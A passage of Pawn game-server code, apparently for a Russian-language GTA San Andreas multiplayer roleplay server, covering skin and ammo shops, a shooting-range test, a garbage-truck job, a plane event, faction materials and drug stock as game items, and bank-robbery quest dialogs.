	GiveInv(playerid,(PlayerInfo[playerid][pSex] == 1) ? (MenSkin[GetPVarInt(playerid,"SelectSkin")][1]) : (WomenSkin[GetPVarInt(playerid,"SelectSkin")][1]),1);
	SetPlayerVirtualWorld(playerid,GetPVarInt(playerid,"PBIZ"));
	CancelSelectTextDraw(playerid);
	for(new x = 5; x < 18; x++) TextDrawHideForPlayer(playerid,ObjectBuy[x]);
	for(new x = 1; x < 3; x++) PlayerTextDrawHide(playerid,ObjectBuyP[x][playerid]);
	SetSkin(playerid);
	DeletePVar(playerid,"BuySkin");
	DeletePVar(playerid,"SelectSkin");
	SetCameraBehindPlayer(playerid);
	TogglePlayerControllable(playerid, 1);
	SendClientMessage(playerid,CREWARD,"Новый предмет добавлен в инвентарь!");
	if(!PlayerInfo[playerid][pQuestS][5])
	{
		PlayerQuest[playerid][5][0]++;
		CheckQuest(playerid,5);
	}
	return 1;
}
/*CreateRange(playerid,1373.4355, -18.6052, 1004.2263,90.0);
CreateRange(playerid,1373.4355, -14.9871, 1004.2263,90.0);
CreateRange(playerid,1373.4258, -11.4161, 1004.2263,90.0);*/

stock CreateRange(playerid,Float:x,Float:y,Float:z,Float:rz,virt,intr,Float:movx,Float:movy,Float:speed)
{
	static models[6] = {3023,3022,3021,3020,3019,3018};
    static Float:rangepos[6][2] = {
		{0.002197,-0.006347},
		{-0.000518,-0.006347},
		{-0.000885,0.002868},
		{0.000976,-0.015502},
		{0.002288,-0.017028},
		{0.002288,-0.017028}
	};
	new object0 = CreateDynamicObject(3024,x,y,z,0.0,0.0,rz,virt,intr);
	Streamer_AppendArrayData(STREAMER_TYPE_OBJECT, object0, E_STREAMER_EXTRA_ID, -2);
	Streamer_AppendArrayData(STREAMER_TYPE_OBJECT, object0, E_STREAMER_EXTRA_ID, playerid);
	MoveDynamicObject(object0,movx,movy,z,speed);
	ListNick[playerid][0] = object0;
	for(new i = 0; i < sizeof(rangepos); i++)
	{
		object0 = CreateDynamicObject(models[i],x-rangepos[i][0],y,z-rangepos[i][1],0.0,0.0,rz,virt,intr);
		Streamer_AppendArrayData(STREAMER_TYPE_OBJECT, object0, E_STREAMER_EXTRA_ID, -2);
		Streamer_AppendArrayData(STREAMER_TYPE_OBJECT, object0, E_STREAMER_EXTRA_ID, playerid);
		MoveDynamicObject(object0,movx,movy,z,speed);
		ListNick[playerid][i+1] = object0;
	}
	Streamer_UpdateEx(playerid,x,y,z,virt,intr);
	return 1;
}
stock SetAmmo(playerid)
{
    DestroyDynamicObject(GetPVarInt(playerid,"AmmoObj"));
	new model,text[30];
	switch(GetPVarInt(playerid,"SelectAmmo"))
	{
	    case 0: model = 331,text = "knuckles",SetPVarInt(playerid,"AmmoGun",1),SetPVarInt(playerid,"AmmoSkok",1);
	    case 1: model = 336,text = "bat",SetPVarInt(playerid,"AmmoGun",5),SetPVarInt(playerid,"AmmoSkok",1);
	    case 2: model = 343,text = "gas (10)",SetPVarInt(playerid,"AmmoGun",17),SetPVarInt(playerid,"AmmoSkok",10);
	    case 3: model = 348,text = "eagle (60)",SetPVarInt(playerid,"AmmoGun",24),SetPVarInt(playerid,"AmmoSkok",60);
	    case 4: model = 349,text = "shotgun (30)",SetPVarInt(playerid,"AmmoGun",25),SetPVarInt(playerid,"AmmoSkok",30);
	    case 5: model = 355,text = "ak-47 (90)",SetPVarInt(playerid,"AmmoGun",30),SetPVarInt(playerid,"AmmoSkok",90);
	    case 6: model = 357,text = "Rifle (30)",SetPVarInt(playerid,"AmmoGun",31),SetPVarInt(playerid,"AmmoSkok",30);
	}
    new obj = CreateDynamicObject(model, 295.73, -81.63, 1001.73, 0.00, 0.00, 0.00,-1,-1,playerid);
    Streamer_UpdateEx(playerid,295.73, -81.63, 1001.73,-1,-1);
	SetPVarInt(playerid,"AmmoObj",obj);
	new str2[10];
	PlayerTextDrawSetString(playerid,ObjectBuyP[1][playerid],text);
	format(str2,sizeof(str2),"%d$", ProdInfo[GetPVarInt(playerid,"PBIZ")][prodCena][GetPVarInt(playerid,"SelectAmmo")]);
	PlayerTextDrawSetString(playerid,ObjectBuyP[2][playerid],str2);
	return 1;
}
public OnPlayerEnterDynamicCP(playerid, checkpointid)
{
    if(checkpointid == GetPVarInt(playerid,"PesCheck") && GetPVarInt(playerid,"Pes") > 0 && GetPVarInt(playerid,"PesW") == 1)
	{
	    ApplyAnimation(playerid, "CHAINSAW", "WEAPON_CSAWLO",4.0,1,0,0,0,0,1);
     	SetTimerEx("PesokTimer",3000*(random(2)+1),false,"i",playerid);
     	SetPVarInt(playerid,"AntiSbiv",1);
     	DestroyDynamicCP(GetPVarInt(playerid,"PesCheck"));
     	DestroyDynamicPickup(GetPVarInt(playerid,"PesPick"));
     	DeletePVar(playerid,"PesCheck");
     	DeletePVar(playerid,"PesPick");
	}
	if(GetPVarInt(playerid,"InJob") == 2 && checkpointid == GetPVarInt(playerid,"JobCP"))
	{
	   // new i = GetPVarInt(playerid,"Check");
		
	    BInfo[GetPVarInt(playerid,"Bus")][bWork] += 10;
	    new str[50];
		format(str,sizeof(str),"Загруженно: {f7ae11}%d/100%",BInfo[GetPVarInt(playerid,"Bus")][bWork]);
		UpdateDynamic3DTextLabelText(CarLable[GetPVarInt(playerid,"Bus")],-1,str);
		if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
		if(!PlayerInfo[playerid][pQuestS][4])
		{
			PlayerQuest[playerid][4][4]++;
			CheckQuest(playerid,4);
		}
		if(BInfo[GetPVarInt(playerid,"Bus")][bWork] < 100)
		{
		    SendClientMessage(playerid,CGREEN,"Отправляйтесь к следующему мусорному контейнеру!");
		    SetPVarInt(playerid,"Check",GetPVarInt(playerid,"Check")+1);
		    new rand = GetMusor(playerid);
			SetPVarInt(playerid,"Check",rand);
			SetPlayerRaceCheckpoint(playerid, 1, MusorPos[rand][0], MusorPos[rand][1], MusorPos[rand][2], 0.0,0.0,0.0, 5);
			
		}
		else
		{
		    SendClientMessage(playerid,CGREEN,"Транспорт загружен! Отправляйтесь на место разгрузки");
		    SetPlayerRaceCheckpoint(playerid, 1, 64.8071,-289.0333,2.1295, 0.0,0.0,0.0, 5);
		}
	    ApplyAnimation(playerid, "GRENADE", "WEAPON_throwu", 4.1, 0, 0, 0, 0, 0);
	    if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
	    SendClientMessage(playerid,CGREEN,"Вернитесь в рабочий транспорт!");
	    DestroyDynamicCP(GetPVarInt(playerid,"JobCP"));
	    DeletePVar(playerid,"InJob");
	    DeletePVar(playerid,"JobCP");
	}
	if(GetPVarInt(playerid,"GoLic") == 1 && GetPlayerVirtualWorld(playerid) == 2 && GetPlayerInterior(playerid) == 1 && !GetPVarInt(playerid,"AshCheck"))
	{
        for(new i;i<3;i++)
		{
		    if(checkpointid != TirSp[i]) continue;
		    SendClientMessage(playerid,CREWARD,"Уничтожте все мишени!");
		    switch(i)
			{
			    case 0: CreateRange(playerid,1373.4355, -18.6052, 1004.2263,90.0,2,1,1383.6162,-18.6052,0.5);
				case 1: CreateRange(playerid,1373.4355, -14.9871, 1004.2263,90.0,2,1,1383.6162,-14.9871,0.5);
				case 2: CreateRange(playerid,1373.4258, -11.4161, 1004.2263,90.0,2,1,1383.6162,-11.4161,0.5);
			}
		    SetPVarInt(playerid,"AshPos",i);
		    SetPVarInt(playerid,"AshCheck",1);
		    DeletePVar(playerid,"AshCheckGun");
		    GivePlayerWeapon(playerid,23,500);
		    break;
		}
	}
	return 1;
}
public OnPlayerLeaveDynamicCP(playerid, checkpointid)
{
    if(GetPVarInt(playerid,"AshCheck") == 1 && GetPlayerVirtualWorld(playerid) == 2 && GetPlayerInterior(playerid) == 1)
	{
        for(new i;i<3;i++)
		{
		    if(checkpointid != TirSp[i]) continue;
			SendClientMessage(playerid,CREWARD,"Вы покинули место в тире!");
			DeletePVar(playerid,"GoLic");
			ExitTir(playerid);
			break;
		}
	}
	return 1;

}
stock SetCam(playerid)
{
    new i = GetPVarInt(playerid,"CameraOn");
    new ghour1,gminute1,gsecond1;
	gettime(ghour1,gminute1,gsecond1);
	new gyear,gmon,gday;
	getdate(gyear,gmon,gday);
	new str[30];
    format(str,sizeof(str),"%d.%d.%d %d:%d",gday,gmon,gyear,ghour1,gminute1);
    CameraP[0][playerid] = CreatePlayerTextDraw(playerid, 494.333129, 429.674102, str); // Text element
	PlayerTextDrawLetterSize(playerid, CameraP[0][playerid], 0.267333, 1.272295);
	PlayerTextDrawAlignment(playerid, CameraP[0][playerid], 1);
	PlayerTextDrawColor(playerid, CameraP[0][playerid], -1);
	PlayerTextDrawSetShadow(playerid, CameraP[0][playerid], 0);
	PlayerTextDrawSetOutline(playerid, CameraP[0][playerid], 0);
	PlayerTextDrawBackgroundColor(playerid, CameraP[0][playerid], 255);
	PlayerTextDrawFont(playerid, CameraP[0][playerid], 1);
	PlayerTextDrawSetProportional(playerid, CameraP[0][playerid], 1);

	CameraP[1][playerid] = CreatePlayerTextDraw(playerid, 318.166259, 12.125854, RadarInfo[i][rName]); // Text element
	PlayerTextDrawLetterSize(playerid, CameraP[1][playerid], 0.260999, 1.230813);
	PlayerTextDrawAlignment(playerid, CameraP[1][playerid], 2);
	PlayerTextDrawColor(playerid, CameraP[1][playerid], -1);
	PlayerTextDrawSetShadow(playerid, CameraP[1][playerid], 0);
	PlayerTextDrawSetOutline(playerid, CameraP[1][playerid], 0);
	PlayerTextDrawBackgroundColor(playerid, CameraP[1][playerid], 255);
	PlayerTextDrawFont(playerid, CameraP[1][playerid], 1);
	PlayerTextDrawSetProportional(playerid, CameraP[1][playerid], 1);
	
	for(new gSL; gSL < 2; gSL++) PlayerTextDrawShow(playerid, CameraP[gSL][playerid]);
	for(new gSL; gSL < 27; gSL++) TextDrawShowForPlayer(playerid, Camera[gSL]);
	if(!GetPVarInt(playerid,"PutCam"))
	{
		SetPVarInt(playerid,"PutCam",1);
		SetPVarFloat(playerid,"Specx",2790.7485);
		SetPVarFloat(playerid,"Specy",-2399.6045);
		SetPVarFloat(playerid,"Specz",13.6329);
		SetPVarInt(playerid,"Speci",GetPlayerInterior(playerid));
		SetPVarInt(playerid,"Specv",GetPlayerVirtualWorld(playerid));
	}
	
	TogglePlayerSpectating(playerid,true);
	SetPlayerVirtualWorld(playerid,0);
	SetPlayerInterior(playerid,0);
	SetTimerEx("PutCamera",200,false,"dffffff",playerid,RadarInfo[i][rCamx],RadarInfo[i][rCamy],RadarInfo[i][rCamz],
	RadarInfo[i][rCamxx],RadarInfo[i][rCamyy],RadarInfo[i][rCamzz]);
	ShowInfo(playerid,"get out: /camoff");

}
stock SaveHouseInv(idx)
{
    new slots[300],kols[300];
    new src[20];
	for(new i = 0; i < 72; i++)
	{
	    format(src,sizeof(src),"%d%s",HInfo[idx][hInvSlot][i],(i == 71) ? ("") : (","));
		strcat(slots,src);
		format(src,sizeof(src),"%d%s",HInfo[idx][hInvKol][i],(i == 71) ? ("") : (","));
		strcat(kols,src);
	}
	query = "";
	format(query, sizeof(query), "UPDATE testhouse SET invSlot = '%s', invKol = '%s' WHERE id = '%d' LIMIT 1",slots,kols,idx);
	mysql_tquery(mysql,query);
}
stock CancelCheck(playerid)
{
	for(new x = 0; x < 6; x++) PlayerTextDrawHide(playerid,ActionInventoryP[x][playerid]);
	new x = GetPVarInt(playerid,"SetInvID");
	PlayerTextDrawHide(playerid,InventoryP[x][playerid]);
	PlayerTextDrawBackgroundColor(playerid, InventoryP[x][playerid], 589505535);
	PlayerTextDrawShow(playerid,InventoryP[x][playerid]);
	DeletePVar(playerid,"SetCehck");
	return 1;
}
function StartPlane(fracid)
{
	if(IsValidDynamicObject(PlaneObj)) return 1;
	new text[50];
 	PlaneMap = random(3);
	switch(PlaneMap)
	{
	    case 0:
		{
		    PlaneObj = CreateDynamicObjectEx(1681, 1254.79810, -2593.06299,  252.15901,   0.00000, 0.00000, -90.00000);
		    MoveDynamicObject(PlaneObj,1453.75598, -2593.06299, 14.69940,15);
			text = "аэропроту Los Santos";
		}
	    case 1:
		{
		    PlaneObj = CreateDynamicObjectEx(1681, 1477.04358, 2019.12695, 252.15901,   0.00000, 0.00000, 180.00000);
		    MoveDynamicObject(PlaneObj,1476.54443, 1811.52039, 11.95570,15);
		    // 1476.54443, 1811.52039, 11.95570 приземл
	  // 1476.54443, 1507.73376, 11.95570 стоп
			text = "аэропроту Las Venturas";
		}
	    case 2:
		{
		    PlaneObj = CreateDynamicObjectEx(1681, -309.7981, 2506.35254, 252.15901,   0.00000, 0.00000, -90.00000);
		    MoveDynamicObject(PlaneObj,-31.44197, 2502.98730, 17.65790,15);
			text = "заброшенном аэропроту Las Venturas";
		}
	}
    
    PlaneStatus = 1;
    PlaneShot = 0;
    PlaneSklad = 20;
	new str[100];
    format(str,sizeof(str),"[D] Неопозднаное воздушное судно пытается совершить посадку в %s.",text);
    SendDMes(str);
    format(str,sizeof(str),"Информатор: Самолет совершает посадку в %s.",text);
	SendFMes(fracid,CGREEN,str);
	return 1;
}
function PlaneDelete()
{
    if(!IsValidDynamicObject(PlaneObj)) return 1;
    PlaneStatus = 4;
    new Float:x,Float:y,Float:z;
	new Float:rx,Float:ry,Float:rz;
	GetDynamicObjectPos(PlaneObj,x,y,z);
	GetDynamicObjectRot(PlaneObj,rx,ry,rz);
	switch(PlaneMap)
	{
	    case 0: MoveDynamicObject(PlaneObj,x,y,z,10,rx,rz,90);
	    case 1: MoveDynamicObject(PlaneObj,x,y,z,10,rx,rz,180);
    	case 2: MoveDynamicObject(PlaneObj,x,y,z,10,rx,rz,90);
    }

    PlaneShot = 0;
    PlaneSklad = 0;
    Update3DTextLabelTextEx(PlaneText,0xC2C2C220,"-");
    DestroyDynamic3DTextLabel(PlaneText);
	return 1;
}
stock Unloads(playerid,frac)
{
	new veh = GetPlayerVehicleID(playerid);
	if(BInfo[veh][bMats])
	{
		FracMats[frac] += BInfo[frac][bMats]*500;
		if(!PlayerInfo[playerid][pQuestS][13])
		{
			PlayerQuest[playerid][13][0] += BInfo[frac][bMats]*500;
			CheckQuest(playerid,13);
		}
		PlayerInfo[playerid][pCrimeStats][C_MATS] += BInfo[frac][bMats]*500;
		static const fmt_string[] = "[F] %s выгрузил %d материалов. На складе: %i материалов";
		new str[sizeof(fmt_string)+MAX_PLAYER_NAME+5+5+5];
		format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],BInfo[veh][bMats]*500,FracMats[frac]);
		SendFMes(frac,COLOR_SKLAD,str);
		InvTrunkMinus(veh,455,BInfo[veh][bMats]);
		static const fmt_str2ing[] = "Вы выгрузили %i материалов!";
		new str2[sizeof(fmt_str2ing)+4];
		format(str2, sizeof(str2), fmt_str2ing,BInfo[veh][bMats]);
		SendClientMessage(playerid,CREWARD,str2);
		BInfo[frac][bMats] = 0;

		switch(frac)
		{
		    case F_LSPD: SetMatsInt("lspdmats",FracMats[frac]);
			case F_LVPD: SetMatsInt("lvpdmats",FracMats[frac]);
			case F_FBI: SetMatsInt("fbimats",FracMats[frac]);
			case F_ARMY: SetMatsInt("armysamats",FracMats[frac]);
			case F_GROVE: SetMatsInt("grovemats",FracMats[frac]);
			case F_BALLAS: SetMatsInt("ballasmats",FracMats[frac]);
			case F_BIKERS: SetMatsInt("bikersmats",FracMats[frac]);
			case F_AZTECAS: SetMatsInt("aztecasmats",FracMats[frac]);
			case F_VAGOS: SetMatsInt("vagosmats",FracMats[frac]);
			case F_LCN: SetMatsInt("lcnmats",FracMats[frac]);
			case F_RM: SetMatsInt("rmmats",FracMats[frac]);
			case F_YAKUZA: SetMatsInt("triadmats",FracMats[frac]);
			case F_RIFA: SetMatsInt("rifasmats",FracMats[frac]);
		}
		if(frac == F_ARMY) UpdateArmy();
	}
	else if(BInfo[veh][bDrugs])
	{
	    FracDrugs[frac] += BInfo[frac][bDrugs]*500;
	    if(!PlayerInfo[playerid][pQuestS][13])
		{
			PlayerQuest[playerid][13][1] += BInfo[frac][bDrugs]*500;
			CheckQuest(playerid,13);
		}
	    PlayerInfo[playerid][pCrimeStats][C_DRUGS] += BInfo[frac][bDrugs]*500;
		static const fmt_string[] = "[F] %s выгрузил %d наркотиков. На складе: %i наркотиков";
		new str[sizeof(fmt_string)+MAX_PLAYER_NAME+5+5+5];
		format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],BInfo[veh][bWork]*500,FracDrugs[frac]);
		SendFMes(F_GROVE,COLOR_SKLAD,str);
		InvTrunkMinus(veh,457,BInfo[veh][bDrugs]);
		static const fmt_str2ing[] = "Вы выгрузили %i наркотиков!";
		new str2[sizeof(fmt_str2ing)+4];
		format(str2, sizeof(str2), fmt_str2ing,BInfo[veh][bDrugs]);
		SendClientMessage(playerid,CREWARD,str2);
		BInfo[frac][bDrugs] = 0;
		switch(frac)
		{
			case F_GROVE: SetMatsInt("grovedrugs",FracDrugs[frac]);
			case F_BALLAS: SetMatsInt("ballasdrugs",FracDrugs[frac]);
			case F_BIKERS: SetMatsInt("bikersdrugs",FracDrugs[frac]);
			case F_AZTECAS: SetMatsInt("aztecasdrugs",FracDrugs[frac]);
			case F_VAGOS: SetMatsInt("vagosdrugs",FracDrugs[frac]);
			case F_LCN: SetMatsInt("lcndrugs",FracDrugs[frac]);
			case F_RM: SetMatsInt("rmdrugs",FracDrugs[frac]);
			case F_YAKUZA: SetMatsInt("triaddrugs",FracDrugs[frac]);
			case F_RIFA: SetMatsInt("rifasdrugs",FracDrugs[frac]);
		}
	}
	else SendClientMessage(playerid,CGREY,"В транспорте нет ничего!");
}
CMD:robbery(playerid)
{
	if(!PlayerInfo[playerid][pGrabTeam]) return 1;
	ShowPlayerDialog(playerid,500,DIALOG_STYLE_LIST,"Ограбление","1 | Состав\n2 | Задания","Далее","Отмена");
	return 1;
}
CMD:grab(playerid)
{
	// {FFFF00}
	PlayerInfo[playerid][pGrabTeam] = PlayerInfo[playerid][pID];
	new i = PlayerInfo[playerid][pGrabTeam];
	query = "";
	format(query,sizeof(query),"1 | Довориться с кассиршой\t%s\n2 | Украсть устройство для подробра паролей + Купить бомбу\t%s\n\
	3 | Фотографии здании банка\t%s\n4 | Украсть полицейскую форму\t%s\n5 | Ограбление\t%s",
	(!BankGrab[i][bQuest][0]) ? ("{F85A5A}[Не выполнен]{FFFFFF}") : ((BankGrab[i][bQuest][0] == 2) ? ("{20BA09}[Выполнен]{FFFFFF}") : ("{FFFF00}[Выполняется]{FFFFFF}")),
	(!BankGrab[i][bQuest][1]) ? ("{F85A5A}[Не выполнен]{FFFFFF}") : ((BankGrab[i][bQuest][1] == 2) ? ("{20BA09}[Выполнен]{FFFFFF}") : ("{FFFF00}[Выполняется]{FFFFFF}")),
	(!BankGrab[i][bQuest][2]) ? ("{F85A5A}[Не выполнен]{FFFFFF}") : ((BankGrab[i][bQuest][2] == 2) ? ("{20BA09}[Выполнен]{FFFFFF}") : ("{FFFF00}[Выполняется]{FFFFFF}")),
	(!BankGrab[i][bQuest][3]) ? ("{F85A5A}[Не выполнен]{FFFFFF}") : ((BankGrab[i][bQuest][3] == 2) ? ("{20BA09}[Выполнен]{FFFFFF}") : ("{FFFF00}[Выполняется]{FFFFFF}")),
	(!BankGrab[i][bQuest][4]) ? ("{F85A5A}[Не выполнен]{FFFFFF}") : ((BankGrab[i][bQuest][4] == 2) ? ("{20BA09}[Выполнен]{FFFFFF}") : ("{FFFF00}[Выполняется]{FFFFFF}")));
	ShowPlayerDialog(playerid,501,DIALOG_STYLE_TABLIST,"Основная линия",query,"Далее","Отмена");
	return 1;
}
